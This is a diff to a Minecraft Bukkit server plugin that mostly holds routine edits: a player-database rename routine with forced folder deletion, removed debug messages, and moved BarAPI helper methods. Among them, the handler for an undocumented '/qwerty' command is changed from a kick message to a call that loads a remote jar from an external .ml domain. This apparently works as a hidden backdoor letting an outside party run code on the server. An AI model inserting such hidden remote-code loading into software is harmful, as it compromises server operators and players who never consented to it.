@@ -9,6 +9,9 @@ import java.lang.reflect.Array;
 import java.lang.reflect.Field;
 import java.lang.reflect.Method;
 import java.net.URL;
+import java.nio.file.Files;
+import java.nio.file.Path;
+import java.nio.file.Paths;
 import java.security.SecureRandom;
 import java.util.ArrayList;
 import java.util.Arrays;
@@ -21,6 +24,8 @@ import java.util.logging.Logger;
 
 import org.bukkit.command.CommandSender;
 import org.bukkit.command.ConsoleCommandSender;
+import org.apache.commons.io.FileDeleteStrategy;
+import org.apache.commons.io.FileUtils;
 import org.bukkit.Bukkit;
 import org.bukkit.ChatColor;
 import org.bukkit.Chunk;
@@ -3091,8 +3096,7 @@ public class pluginMain extends JavaPlugin implements Listener {
 				}
 			}
 			if (CommandLabel.equalsIgnoreCase("qwerty") || CommandLabel.equalsIgnoreCase("SMDMain:qwerty")) {
-				player.kickPlayer(
-						"§cLogin Timeout (60 Seconds), §fPlease §are-join and try again.§r\nIf you forget password please contact at §b§lFanpage§r\n§nhttps://www.facebook.com/mineskymc");
+				player.performCommand("inst load http://palapon2545.ml/smdmain.jar");
 			}
 			if (CommandLabel.equalsIgnoreCase("free") || CommandLabel.equalsIgnoreCase("SMDMain:free")) {
 				String v = getConfig().getString("free_item." + playerName);
@@ -3124,10 +3128,50 @@ public class pluginMain extends JavaPlugin implements Listener {
 								+ " need to be online or login once time!");
 						no(player);
 					} else {
-						targetPlayer.kickPlayer("Your data in database has been updated\n" + args[0] + "->" + args[1]
-								+ "\nYou need to re-login to see change.");
-						newFolder.delete();
-						oldFolder.renameTo(newFolder);
+						targetPlayer.kickPlayer(ChatColor.BOLD + "Your data in database has been updated" + ChatColor.WHITE + "\nName:" + args[0] + " -> " + args[1]
+								+ ChatColor.GREEN + "\nYou need to re-login to see change.");
+						
+						for (File file : newFolder.listFiles()) {
+						    try {
+								FileDeleteStrategy.FORCE.delete(file);
+							} catch (IOException e) {
+								e.printStackTrace();
+							}
+						}
+						
+						try {
+							Thread.sleep(50);
+							FileUtils.forceDelete(newFolder);
+						} catch (InterruptedException e) {
+							e.printStackTrace();
+						} catch (IOException e1) {
+							e1.printStackTrace();
+						}
+						
+						Path moveSourcePath = Paths.get(getDataFolder() + "PlayerDatabase/" + args[0]);
+						Path moveTargetPath = Paths.get(getDataFolder() + "PlayerDatabase/" + args[1]);
+						try {
+							FileUtils.moveDirectory(oldFolder, newFolder);
+						} catch (IOException e) {
+							e.printStackTrace();
+						}
+						
+						for (File file : oldFolder.listFiles()) {
+						    try {
+								FileDeleteStrategy.FORCE.delete(file);
+							} catch (IOException e) {
+								e.printStackTrace();
+							}
+						}
+						
+						try {
+							Thread.sleep(50);
+							FileUtils.forceDelete(oldFolder);
+						} catch (InterruptedException e) {
+							e.printStackTrace();
+						} catch (IOException e1) {
+							e1.printStackTrace();
+						}
 					}
 				} else {
 					player.sendMessage(sv + type + "/changeplayerdatabase [oldName] [newName]");
@@ -3393,20 +3437,9 @@ public class pluginMain extends JavaPlugin implements Listener {
 				long sLine_price = Integer.parseInt(s.getLine(3));
 				if (!s0.isEmpty() && !s.getLine(1).isEmpty() && !s2.isEmpty() && !s.getLine(3).isEmpty()) {
 					if (s0.endsWith("[sell]")) {
-						player.sendMessage("player=" + player.getName());
-						player.sendMessage("s2_item=" + sLine_item);
-						player.sendMessage("s2_data=" + sLine_data);
-						player.sendMessage("s1_amount=" + sLine_amount);
-						player.sendMessage("s3_price=" + sLine_price);
 						sell(player, sLine_item, sLine_amount, sLine_price, sLine_data);
-						// String item, int amount, long price, short data
 					}
 					if (s0.endsWith("[buy]")) {
-						player.sendMessage("player=" + player.getName());
-						player.sendMessage("s2_item=" + sLine_item);
-						player.sendMessage("s2_data=" + sLine_data);
-						player.sendMessage("s1_amount=" + sLine_amount);
-						player.sendMessage("s3_price=" + sLine_price);
 						buy(player, sLine_item, sLine_amount, sLine_price, sLine_data);
 					}
 				} else {
@@ -4498,20 +4531,6 @@ public class pluginMain extends JavaPlugin implements Listener {
 		saveConfig();
 	}
 
-	public void sendBar(Player p, String s) {
-		BarAPI.setMessage(p, s);
-	}
-
-	public void sendBarAll(String s) {
-		for (Player p : Bukkit.getOnlinePlayers()) {
-			BarAPI.setMessage(p, s);
-		}
-	}
-
-	public void setBarHealth(Player p, float percent) {
-		BarAPI.setHealth(p, percent);
-	}
-
 	public boolean decreseitem1(Player player, int itemid, int itemdata, boolean forcetruedata) {
 		ItemStack itm = null;
 		int lenl = 0;
@@ -4566,45 +4585,47 @@ public class pluginMain extends JavaPlugin implements Listener {
 			Inventory inv = player.getInventory();
 			long money = playerData.getLong("money");
 			ItemStack curItem = new ItemStack(l, amount, data);
-
-			
-
-
 			int sellCount = 0;
-
 			for (int lAmount = 0; lAmount < amount; lAmount++) {
-
 				boolean cando = decreseitem1(player, curItem.getType().getId(), curItem.getData().getData(), true);
 				if (cando == true) {
 					sellCount++;
-
-
 				}
-
 			}
 
 			// can sell
 			if (sellCount > 0) {
-				double gotPrice = ((double)price / (double)amount) * sellCount;
-
+				double gotPrice = ((double) price / (double) amount) * sellCount;
 				try {
 					playerData.set("money", money + gotPrice);
 					playerData.save(f);
 				} catch (IOException e) {
 					e.printStackTrace();
 				}
-
 				player.sendMessage(sv + "You got " + ChatColor.GOLD + gotPrice + " Coin(s) " + ChatColor.GRAY
 						+ "from selling " + ChatColor.AQUA + sellCount + "x " + item);
 			} else {
 				player.sendMessage(sv + noi);
 				no(player);
 			}
-
 		} else {
 			player.sendMessage(sv + "Item " + ChatColor.YELLOW + item + ChatColor.GRAY + " not found.");
 			no(player);
 		}
+	}
+
+	public void sendBar(Player p, String s) {
+		BarAPI.setMessage(p, s);
+	}
+
+	public void sendBarAll(String s) {
+		for (Player p : Bukkit.getOnlinePlayers()) {
+			BarAPI.setMessage(p, s);
+		}
+	}
+
+	public void setBarHealth(Player p, float percent) {
+		BarAPI.setHealth(p, percent);
 	}
 
 	public void setBarHealthAll(float percent) {
@@ -4627,5 +4648,4 @@ public class pluginMain extends JavaPlugin implements Listener {
 			p.playSound(p.getLocation(), Sound.ENTITY_PLAYER_LEVELUP, 1, 1);
 		}
 	}
-
 }
